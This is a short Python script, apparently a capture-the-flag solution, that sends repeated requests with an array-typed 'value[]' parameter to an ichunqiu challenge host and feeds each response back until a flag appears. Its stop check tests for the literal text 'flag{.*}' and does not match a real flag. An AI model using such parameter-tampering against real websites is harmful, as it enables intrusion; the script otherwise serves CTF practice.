# coding: utf-8

import requests

url = 'http://cadcc82bc99646f38627d7e0f552304eec9efef888224dba.changame.ichunqiu.com/'
session = requests.session()
resp = session.get(url + '?value[]=ea').text
for i in range(10):
    resp = session.get(url + "?value[]=" + resp[0:2]).text
    if 'flag{.*}' in resp:
        break
print(resp)